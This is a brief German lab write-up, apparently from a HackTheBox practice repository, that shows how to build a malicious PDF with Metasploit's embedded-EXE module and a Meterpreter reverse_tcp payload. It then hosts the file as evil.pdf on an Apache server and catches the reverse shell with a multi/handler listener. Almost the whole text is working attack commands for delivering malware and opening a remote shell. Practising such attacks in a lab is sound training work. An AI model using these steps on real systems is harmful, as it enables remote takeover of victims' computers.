# Writeup Virus.pdf
### Zugriff mittels Schadsoftware

![63e1d1f00c0f5d454ed2ebbb-1 (1)](https://github.com/Netzknoten/HackTheBoxDevelopment/assets/114874531/90c37b2b-4d65-4fbe-96eb-eb199447fb73)


### Erstellen der Maleware und Ausführung des Angriffs.
- Metasploit starten
		
		msfconsole
		use Exploit/windows/fileformat/adobe_pdf_embedded_exe
		set payload/windows/x64/meterpreter/reverse_tcp
		ip addr
		set LHOST <myIP>
		exploit
		
- Schadcode Bereitstellen

		sudo mv /root/.msf4/local/evil.pdf /var/www/html/evil.pdf
		sudo systemctl start apache2.service
		
- Ausführen der Maleware

Gehen sie im Webbrowser und geben sie <ip_address>/evil.pdf ein! 
Dann die Software auf dem Zielrechner speichern. Zurück in Metasploit,
		
		use exploit/multi/handler
		set payload windows/x64/meterpreter/reverse_tcp
		set LHOST <myIP>
		exploit
		
Danach das evil.pdf ausführen und speichern.		
		
		
		
